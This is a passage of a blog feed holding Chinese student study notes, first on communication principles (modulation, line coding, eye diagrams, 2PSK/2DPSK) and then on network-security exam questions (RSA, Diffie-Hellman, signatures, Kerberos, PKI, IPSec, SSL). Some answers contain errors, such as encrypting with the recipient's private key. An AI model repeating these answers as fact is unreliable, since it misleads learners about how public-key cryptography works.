n(t)是叠加在信号上的，而无论有无信号，噪声n(t)是始终存在的，该n(t)称加性干扰。<br>信道的作用相当于对输入信号乘一个系数k(t)，该k(t)可看作是对信号的一种干扰，k(t)称为乘性干扰。</p><blockquote><p>无论信号有无都存在的噪声称为加性干扰;随信号大小变化的干扰称为乘性千扰~~(这个是原答案)~~</p></blockquote></blockquote><p>4-17试述信道容量的定义?</p><blockquote><p>信道容量是指信道能够传输的最大平均信息量</p></blockquote><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215001532071.png" alt="image-20221215001532071" style="zoom:67%;" /> <h5 id="第五章"><strong>第五章</strong></h5><p>模拟调制分为：幅度调制和角度调制</p><ul><li><p>幅度调制包括：调幅AM、双边带DSB、单边带SSB、残留边带VSB调制</p><ul><li>所占带宽、特点、调制效率(功率利用率)</li><li>调幅AM特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003003169.png" alt="image-20221215003003169" style="zoom: 33%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003100632.png" alt="image-20221215003100632" style="zoom: 33%;" /></li><li>双边带DSB特点：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003417004.png" alt="image-20221215003417004" style="zoom: 33%;" /></li><li>单边带SSB：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003509942.png" alt="image-20221215003509942" style="zoom:33%;" /></li><li>残留边带VSB调制：<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003542088.png" alt="image-20221215003542088" style="zoom:33%;" /></li></ul><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20221215003706914.png" alt="image-20221215003706914" style="zoom: 33%;" /> </center></li></ul><center>P122页表格</center>- 角度调制分为：调频FM和调相PM<p>线性调制的通用模型：滤波法和相移法</p><p>解调方法：相干解调和非相干解调</p><p>5-1何为调制?调制在通信系统中的作用是什么?</p><pre class="line-numbers language-none"><code class="language-none">调制:把信号转换成适合在信道中传输的形式的一种过程（按调制信号的变化规律去控制载波的某个参数的过程，书上解释）作用:频谱搬移;实现信道的多路复用;扩展信号带宽,提高系统的抗干扰能力、抗衰落能力，还可实现传输带宽与信噪比之间的互换。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5-2什么是线性调制?常见的线性调制有哪些?</p><blockquote><p>正弦载波的幅度随调制信号做线性变化的过程。从频谱上说，已调信号的频谱结构与基带信号的频谱结构相同，只是频率位置发生变化。</p></blockquote><blockquote><p>常见的线性调制有调幅（AM)、双边带调制(DSB)、单边带调制(SSB)和残留边带调制(VSB)</p></blockquote><p>5-5为什么要抑制载波?相对AM信号来说，抑制载波的双边带信号可以增加多少功效?</p><blockquote><p>抑制载波可以提高调制效率；对于抑制载波的双边带，可以使其调制效率由1/3提高到1</p></blockquote><p>5-9DSB调制系统和SSB调制系统的抗噪声性能是否相同，为什么?</p><blockquote><p>相同，如果解调器的输入噪声功率密度相同，输入信号功率也相同，则单边带和双边带解调器输出的信噪比是相等的</p></blockquote><h5 id="第六章"><strong>第六章</strong></h5><p>6-4构成AMI码和HDB3码的规则是什么?它们各有什么优缺点?</p><blockquote><p>AMI的编码规则:将消息代码0（空号）仍然变换成传输码0，而把1(传码）交替的变换为传输码的+1，-1…。因此AMI码为三电平序列，三元码，伪三进制，1B/1T码。</p></blockquote><ul><li>AMI的优点:0,1不等概率是也无直流；零频附近的低频分量小；整流后即RZ码；编译码电路简单而且便于观察误码情况</li><li>AMI的缺点是:连续0码多时，RZ码连0也多，不利于提取高质量的位同步信号</li></ul><blockquote><p>HDB3的编码规则:先把消息代码变换AMI码，然后去检查AMI码的连零情况，没有四个或者四个以上的连零串时,这时的AMI码就是HDB3码;当出现四个或者四个以上的连零串时，将四个连零小段的第四个0变换于迁移非0符号同极性的符号，称为v符号（破坏码)。当相邻V符号之间有偶数个非零符号时，再将该小段的第一个0变成+B或者-B（平衡码)，B符号的极性与前一非零符号的极性相反，并让后面的非О符号从V符号开始再交替变化。</p></blockquote><p>HDB3码的优点:保持了AMl的优点，还增加了使连零串减少到至多三个，对于定时信号的恢复是十分有利的。</p><p>6-6什么是码间串扰?它是如何产生的?对通信质量有什么影响?</p><pre class="line-numbers language-none"><code class="language-none">(1)码间串扰:由于系统的总特性不理想，导致前后码元的波形畸变、展宽，并使前面的波形出现很长的拖尾，蔓延到当前码元的抽样时刻，从而对当前码元的判决造成干扰(2)码间干扰的产生是因为在第k个抽样时刻理想状态时抽样时刻所得的是仅有第k个波形在此时刻被取值，但在实际系统中，会有除了第k个波形以外的波形可能再抽样时刻被取值。码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降(3)码间干扰会导致判决电路对信号进行误判，使信号失真，产生误码，从而通信质量下降<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6-7 为了消除码间串扰，基带传输系统的传输函数应满足什么条件?其相应的冲激响应应具有什么特点?</p><p>为消除码间串扰，基带传输系统的传输函数应满足:</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\传输函数.png"  /><p>即满足无码间串扰频域条件。</p><p>其相应的冲激响应应具有：</p><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\冲激响应.png"  /><p>即具有无码间串扰时域条件。</p><p>6-8何谓奈奎斯特速率和奈奎斯特带宽?此时的频带利用率有多大?</p><blockquote><p>理想低通传输特性的带宽称为奈奎斯特带宽,将该系统无码间干扰的最高传输速率称为奈奎斯特速率。此时频带利用率为2B/Hz</p></blockquote><p>6-13什么是眼图?它有什么作用?由眼图模型可以说明基带传输系统的哪些性能?具有升余弦脉冲波形的HDB,码的眼图应是什么样的图形?</p><blockquote><p>眼图是实验手段估计基带传输系统性能的一种方法。它是指接收滤波器输出信号波形在示波器上叠加所形成的图像</p></blockquote><pre class="line-numbers language-none"><code class="language-none">眼图和系统性能的关系：1.最佳抽样时刻是“眼睛”张最大的时刻;2.对定时误差的灵敏度可由眼睛的斜率决定，斜率越陡，对定时误差就越灵敏;3.图中阴影区域的垂直高度表示信号畸变范围;4.图中央的横轴位置对应判决门限电平;5.在抽样时刻上，上下阴影区的间隔距离之半为噪声容限,即若噪声瞬时值超过这个容限，就可能发生错误判决眼图：一种宏观评价系统性能得一种手段；&#96;最佳抽样时刻：眼睛张开最大得时刻；定时误差灵敏度：眼眶的斜率，斜率越大越敏感；判决明显电平：横轴；噪声容限：纵轴；(1)最佳取样时刻应选择在眼睛张开最大的时刻;(2)眼睛闭合的速率，即眼图斜边的斜率，表示系统对定时误差灵敏的程度，斜边愈陡，对定位误差愈敏感;(3)在取样时刻上，阴影区的垂直宽度表示最大信号失真量;(4)在取样时刻上，上下两阴影区的间隔垂直距离之半是最小噪声容限，噪声瞬时值超过它就有可能发生错误判决;(5)阴影区与横轴相交的区间表示零点位置变动范围，它对于从信号平均零点位置提取定时信息的解调器有重要影响。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有升余弦脉冲波形的HDB,码的眼图中间会有一条代表0的水平线</p><h5 id="第七章"><strong>第七章</strong></h5><p>P205页信息</p><p>7-1什么是数字调制?它和模拟调制有哪些异同点?</p><blockquote><p>数字调制是用载波信号的某些离散状态来表征传送的信息,在接收端对载波信号的离散调制参量进行检测。<br>和模拟调制一样数字调制也有调幅，调频和调相三种基本形式，并可以派生出多种其他形式。在原理上二者并没有什么区别。只不过模拟调制是对载波信号的参量进行离散调制，在接收端也只需对载波信号的离散调制参量估值</p></blockquote><p>7-2数字调制的基本方式有哪些?其时间波形上各有什么特点?数字调制技术有两种方法:</p><blockquote><p>一是利用模拟调制方法去实现数字式调制，即把数字调制看成是模拟调制的一个特例，把数字基带信号当成模拟信号的特殊情况处理</p></blockquote><blockquote><p>二是利用数字信号的离散取值的特点通过开关键控载波，从而实现数字调制，这种调制方式通常有幅度键控、频率键控和相位键控。其时间波形上来说，有可能是不连续的</p></blockquote><p>7-5什么是频移键控?2FSK信号产生和解调方法有哪些?</p><blockquote><p>频移键控是指用不同的载频来表示所传送的数字信息。<br>产生:1、利用矩形脉冲序列对一个载波进行调频产生;2、利用受矩形脉冲序列控制的开关电路对两个不同的频率进行选通，即键控法。<br>解调:通常采用非相干解调和相干解调两种方法，同时还有鉴频法，过零检测法和差分检波法</p></blockquote><p>7-62FSK信号相邻码元的相位是否连续变化与其产生方法有何关系?</p><blockquote><p>采用模拟调频电路实现的2FSK信号，其相位变化是连续的;采用数字键控法产生的2FSK信号其相位变化不一定连续</p></blockquote><p>7-8什么是绝对移相?什么是相对移相?他们有何区别?绝对移相是用载波的相位直接表示码元;</p><blockquote><p>相对移相是用相邻码元的相对载波相位值表示数字信息。<br>相对移相信号可以看作是把数字信息序列绝对码变换成相对码,然后根据相对码进行绝对移相而成</p></blockquote><p>7-92PSK信号和2DPSK信号可以用哪些方法产生和解调?它们是否可以采用包络检波法解调?为什么?</p><blockquote><p>2PSK信号和2DPSK信号可以用模拟调制法和键控调制法产生;<br>2PSK信号可以用极性比较法，鉴相法解调，2DPSK信号通常用极性比较码变换法，差分相干法解调。<br>它们都不能采用包络检波法解调，因为它们是用相位而不是振幅来携带传送信息的</p></blockquote><p>7-102PSK信号及2DPSK信号的功率谱密度有何特点?试将它们与OOK信号的功率谱密度加以比较。</p><blockquote><p>2PSK信号的功率谱密度同样由离散谱和连续谱组成，但当双极性基带信号以相等的概率出现时，不存在离散谱部分。同时，连续谱部分与2ASK信号基本相同，因此，2PSK信号的带宽也与2ASK信号相同。此外，2DPSK信号的带宽也与2ASK信号的相同</p></blockquote><p>补充2DPSK如何克服π现象？</p><p>DPSK</p><pre class="line-numbers language-none"><code class="language-none">2PSK的“倒∏现象”或“反向工作”:在波形图中,假设相干载波的基准相位与2PSK信号的调制载波的基准相位一致(通常默认为0相位)。但是,由于在2PSK信号的载波恢复过程中存在着的相位模糊,即恢复的本地载波与所需的相干载波可能同相,也可能反相,这种相位关系的不确定性将会造成解调出的数字基带信号与发送的数字基带信号正好相反,即“1”变为“0”,“0”变为“1”,判决器输出数字信号全部出错。这种现象称为2PSK 方式的“倒π”现象或“反相工作”。这也是2PSK方式在实际中很少采用的主要原因。另外,在随机信号码元序列中,信号波形有可能出现长时间连续的正弦波形,致使在接收端无法辨认信号码元的起止时刻。为了解决上述问题,可以采用差分相移键控(DPSK)体制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <center><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\2DPSK相干解调法.png" style="zoom:50%;" /></center> ]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;第一章&quot;&gt;&lt;strong&gt;第一章&lt;/strong&gt;&lt;/h5&gt;
&lt;p&gt;1-11衡量数字通信系统有效性和可靠性的性能指标有哪些?&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有效性用传输速率和频带利用率来衡量，可靠性用误码率、误信率来衡量&lt;/p&gt;
&lt;/blockquote</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://shierjinghuang.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="通信原理" scheme="https://shierjinghuang.github.io/tags/%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络安全思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-03T01:12:38.000Z</published>
    <updated>2025-03-29T03:49:56.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font color=orange>设计Kerberos是为了解决哪些问题？</font></p></li><li><p>Kerberos的设计目的就是解决分布式网络环境下用户访问网络资源时的安全问题，即工作站的用户希望获得服务器上的服务、服务器能够对服务请求进行认证，并能限制授权用户的访问</p></li><li><p><font color=orange>在Kerberos中，什么是门票？什么是门票分发门票？</font></p><ul><li>用户需要访问远程服务或资源，其工作站代替用户向KDC提出申请。KDC为双方生成一个共享密钥，并分别用用户和远程服务的主密钥加密这个会话密钥，再将这些信息发送给工作站。该消息包括用远程资源或服务的主密钥加密的会话密钥，以及用户的名字等信息。这部分信息称为访问远程资源的门票**<del>（这部分内容来自课件）</del>**</li><li>工作站向KDC申请会话密钥，KDC生成会话密钥，并发送一个门票分发门票(TGT)给工作站，TGT包括用KDC的主密钥加密的会话密钥，还包括用户名字和会话密钥过期时间等。</li></ul></li><li><p><font color=orange>简述Kerberos用户中用户工作站获得会话秘钥和TTG的过程以及获得服务授权门票的过程</font></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/获得会话秘钥与TGT.png" style="zoom: 50%;" /><p><strong><font color=orange>获取服务授权门票见课本P89</font></strong></p></li><li><p>什么是证书，证书的基本功能是什么？</p><ul><li>证书就是一种经过签名的消息，用来确定某个名字和某个公钥的绑定关系</li></ul></li><li><p>简述X.509双向认证过程</p><ul><li><p style="color:blue;">课本100页大段,因为存在大段公式推荐看课本</p></li></ul></li><li><p>一个完整的PKI应用系统包括哪些组成成分？各自具有什么功能？</p><ul><li>一个完整的PKI应用系统必须包括：权威认证机构（CA）、数字证书库、秘钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分<ul><li>权威认证机构（CA）：是PKI的核心执行机构，是数字证书生成、发放的运行实体，一般情况下也是证书撤销列表(CRL)的发布点</li><li>数字证书库：证书库是CA颁发证书和撤销证书的集中存放地，可以供公众进行开放式查询</li><li>秘钥备份及恢复系统：提供备份与恢复秘钥的机制</li><li>证书作废系统：</li><li>应用接口（API）：提供良好的应用接口系统使得各个的应用程序能够以安全、一致可信的方式与PKI交互</li></ul></li></ul></li></ul><h3 id="第五章-Internet安全"><a href="#第五章-Internet安全" class="headerlink" title="第五章 Internet安全"></a>第五章 Internet安全</h3><h4 id="思考题-2"><a href="#思考题-2" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong><font color=skyblue>IPSec提供哪些服务？（考察）</font></strong></p><p style="color:blue;">IPSec将密码技术应用在网络层，提供端对端通信数据的私有性、完整性、真实性、防重放攻击等安全服务</p></li><li><p><strong><font color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font 